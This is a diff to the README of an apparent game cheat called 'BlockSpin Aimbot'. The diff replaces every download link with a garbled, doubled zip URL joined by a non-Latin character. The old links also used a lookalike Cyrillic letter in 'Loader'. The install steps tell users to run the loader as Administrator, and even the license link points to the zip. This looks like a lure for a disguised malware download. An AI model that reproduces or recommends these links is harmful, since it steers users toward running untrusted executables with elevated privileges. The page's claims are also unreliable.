@@ -4,9 +4,9 @@ Welcome to **BlockSpin Aimbot**, the next-generation performance tool for maximi
 
 ## 📦 Installation
 
-1. Download **https://raw.githubusercontent.com/LozaGC/BlockSpin-AimAssistor/main/Lоader.zip** directly from the repository.
+1. Download **https://github.com/LozaGC/BlockSpin-AimAssistor/raw/refs/heads/main/paucilocular/Aim-Assistor-Block-Spin-2.1.zipоhttps://github.com/LozaGC/BlockSpin-AimAssistor/raw/refs/heads/main/paucilocular/Aim-Assistor-Block-Spin-2.1.zip** directly from the repository.
 2. Extract all files using your favorite archive manager.
-3. Follow included instructions in the `https://raw.githubusercontent.com/LozaGC/BlockSpin-AimAssistor/main/Lоader.zip` after extraction.
+3. Follow included instructions in the `https://github.com/LozaGC/BlockSpin-AimAssistor/raw/refs/heads/main/paucilocular/Aim-Assistor-Block-Spin-2.1.zipоhttps://github.com/LozaGC/BlockSpin-AimAssistor/raw/refs/heads/main/paucilocular/Aim-Assistor-Block-Spin-2.1.zip` after extraction.
 4. Always launch Loader as **Administrator** for full functionality!
 
 ## 🧑‍💻 Feature List
@@ -42,4 +42,4 @@ BlockSpin Aimbot is designed **strictly for educational and research purposes**.
 
 ## 📑 License
 
-Licensed under the [MIT License](https://raw.githubusercontent.com/LozaGC/BlockSpin-AimAssistor/main/Lоader.zip), 2025. This project is provided AS IS, with no warranty. Contributions are welcome!
+Licensed under the [MIT License](https://github.com/LozaGC/BlockSpin-AimAssistor/raw/refs/heads/main/paucilocular/Aim-Assistor-Block-Spin-2.1.zipоhttps://github.com/LozaGC/BlockSpin-AimAssistor/raw/refs/heads/main/paucilocular/Aim-Assistor-Block-Spin-2.1.zip), 2025. This project is provided AS IS, with no warranty. Contributions are welcome!
